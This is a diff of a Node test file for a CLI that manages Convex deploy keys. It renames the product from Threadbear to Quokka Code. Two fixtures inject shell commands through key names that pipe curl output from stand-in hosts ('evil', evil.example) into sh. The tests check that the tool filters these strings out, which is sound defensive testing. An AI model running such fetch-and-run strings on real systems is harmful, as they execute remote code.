@@ -194,14 +194,14 @@ test("a Mac whose runner id isn't one as written (spaces, \"any\") gets no key",
 });
 
 test('tb runner add warns when the other Mac also has a deploy key or a Convex login', async () => {
-  const s = setup(undefined, [], ['deploy-env', 'cli-login', 'panel threadbear-panel-bruce-abc123']);
+  const s = setup(undefined, [], ['deploy-env', 'cli-login', 'panel quokkacode-panel-bruce-abc123']);
   assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 0);
   const out = s.printed.join('\n');
   assert.match(out, /convex-deploy\.env/);
   assert.match(out, /convex logout/);
   // Revoke on Convex's side first, by name, then rotate: deleting a file revokes nothing.
   assert.match(out, /[Rr]evoke/);
-  assert.match(out, /deployment token delete threadbear-panel-bruce-abc123 --deployment opulent-moose-249/);
+  assert.match(out, /deployment token delete quokkacode-panel-bruce-abc123 --deployment opulent-moose-249/);
   assert.match(out, /https:\/\/dashboard\.convex\.dev\/d\/opulent-moose-249\/settings/);
   assert.match(out, /rotate-owner/);
   // tb runner check --ssh says the same on its own, and fails.
@@ -213,7 +213,7 @@ test('tb runner add warns when the other Mac also has a deploy key or a Convex l
   const down = setup(undefined, [], ['down']);
   assert.equal(await runnerKeysCommand(down.cfg, ['check'], { ssh: 'bruce' }, down.deps), 1);
   assert.match(down.printed.join('\n'), /couldn't/i);
-  const panels = setup(undefined, [], ['panel threadbear-panel-bruce-abc123']);
+  const panels = setup(undefined, [], ['panel quokkacode-panel-bruce-abc123']);
   assert.equal(await runnerKeysCommand(panels.cfg, ['check'], { ssh: 'bruce' }, panels.deps), 1);
 });
 
@@ -227,10 +227,10 @@ test("tb runner check on a Mac with a runner key says if a deploy key is still t
   // The Convex panel's cached deploy keys count too.
   fs.rmSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'));
   fs.mkdirSync(path.join(s.cfg.home, 'secrets', 'convex-panels'));
-  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-panels', 'opulent-moose-249.json'), JSON.stringify({ name: 'threadbear-panel-bruce-ff00aa', adminKey: 'prod:secret' }));
+  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-panels', 'opulent-moose-249.json'), JSON.stringify({ name: 'quokkacode-panel-bruce-ff00aa', adminKey: 'prod:secret' }));
   s.printed.length = 0;
   assert.equal(await runnerKeysCommand(s.cfg, ['check'], {}, s.deps), 1);
-  assert.match(s.printed.join('\n'), /threadbear-panel-bruce-ff00aa/);
+  assert.match(s.printed.join('\n'), /quokkacode-panel-bruce-ff00aa/);
   assert.doesNotMatch(s.printed.join('\n'), /prod:secret/);
 });
 
@@ -246,8 +246,8 @@ test('tb runner rotate-owner moves the main key with no gap: NEXT first, this Ma
   fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
   const keyFile = path.join(s.cfg.home, 'secrets', 'convex-key');
   // Keys this Mac made itself, as it recorded them when it made them.
-  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'threadbear-runner-m5\nthreadbear-panel-m5-a1b2c3\n');
-  s.keys([{ name: 'threadbear-runner-m5', creationTime: 1 }, { name: 'threadbear-panel-m5-a1b2c3', creationTime: 2 }]);
+  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'quokkacode-runner-m5\nquokkacode-panel-m5-a1b2c3\n');
+  s.keys([{ name: 'quokkacode-runner-m5', creationTime: 1 }, { name: 'quokkacode-panel-m5-a1b2c3', creationTime: 2 }]);
   assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], {}, s.deps), 0);
   const fresh = fs.readFileSync(keyFile, 'utf8').trim();
   assert.match(fresh, /^[0-9a-f]{64}$/);
@@ -360,13 +360,13 @@ test("setup won't copy or set the main key while a rotation is under way", () =>
 test("rotate-owner won't run while Convex lists a deploy key this Mac didn't make, unless it's been looked at", async () => {
   const s = setup();
   fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
-  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'threadbear-runner-m5\n');
+  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'quokkacode-runner-m5\n');
   // Bruce's, one with no Mac in its name, and one named to look like this Mac's: none provably this Mac's.
-  s.keys([{ name: 'threadbear-runner-m5', creationTime: 1 }, { name: 'threadbear-runner-bruce', creationTime: 2, lastUsedTime: 3 }, { name: 'threadbear-runner', creationTime: 4 }, { name: 'x; curl evil|sh \u001b[2K', creationTime: 5 }]);
+  s.keys([{ name: 'quokkacode-runner-m5', creationTime: 1 }, { name: 'quokkacode-runner-bruce', creationTime: 2, lastUsedTime: 3 }, { name: 'quokkacode-runner', creationTime: 4 }, { name: 'x; curl evil|sh \u001b[2K', creationTime: 5 }]);
   assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], {}, s.deps), 1);
   const out = s.printed.join('\n');
-  assert.match(out, /threadbear-runner-bruce/);
-  assert.match(out, /threadbear-runner,/);
+  assert.match(out, /quokkacode-runner-bruce/);
+  assert.match(out, /quokkacode-runner,/);
   assert.match(out, /dashboard\.convex\.dev\/d\/opulent-moose-249\/settings/);
   assert.match(out, /CLI login/);
   assert.doesNotMatch(out, /\u001b/);
@@ -403,11 +403,11 @@ test('tb runner check counts a team token left on disk as admin credentials too'
   assert.match(r.printed.join('\n'), /team access token/);
 });
 
-test("a remote panel key's name is used only when it looks like one Threadbear made", async () => {
-  const s = setup(undefined, [], ['panel x; curl https://evil.example|sh #', 'panel threadbear-panel-bruce-abc123']);
+test("a remote panel key's name is used only when it looks like one Quokka Code made", async () => {
+  const s = setup(undefined, [], ['panel x; curl https://evil.example|sh #', 'panel quokkacode-panel-bruce-abc123']);
   assert.equal(await runnerKeysCommand(s.cfg, ['check'], { ssh: 'bruce' }, s.deps), 1);
   const out = s.printed.join('\n');
-  assert.match(out, /deployment token delete threadbear-panel-bruce-abc123/);
+  assert.match(out, /deployment token delete quokkacode-panel-bruce-abc123/);
   assert.doesNotMatch(out, /curl/);
   assert.match(out, /unrecognised name/);
 });
@@ -433,12 +433,12 @@ test('the remote admin check runs under a zsh login shell with nothing to find',
 
 test('the remote admin check still finds a panel key name, quotes and all', () => {
   const home = tmpDir();
-  const d = path.join(home, 'Library/Application Support/Threadbear/secrets/convex-panels');
+  const d = path.join(home, 'Library/Application Support/QuokkaCode/secrets/convex-panels');
   fs.mkdirSync(d, { recursive: true });
-  fs.writeFileSync(path.join(d, 'x.json'), '{"name":"threadbear-panel-bruce-abc123","adminKey":"secret"}');
+  fs.writeFileSync(path.join(d, 'x.json'), '{"name":"quokkacode-panel-bruce-abc123","adminKey":"secret"}');
   const r = spawnSync(ZSH ?? '/bin/sh', ['-c', remoteCommand(REMOTE_ADMIN_CHECK)], { env: { HOME: home, PATH: '/usr/bin:/bin' }, encoding: 'utf8' });
   assert.equal(r.status, 0, r.stderr);
-  assert.deepEqual(r.stdout.trim().split('\n'), ['panel threadbear-panel-bruce-abc123', 'checked']);
+  assert.deepEqual(r.stdout.trim().split('\n'), ['panel quokkacode-panel-bruce-abc123', 'checked']);
 });
 
 // The Convex CLI's env commands need a folder whose package.json lists
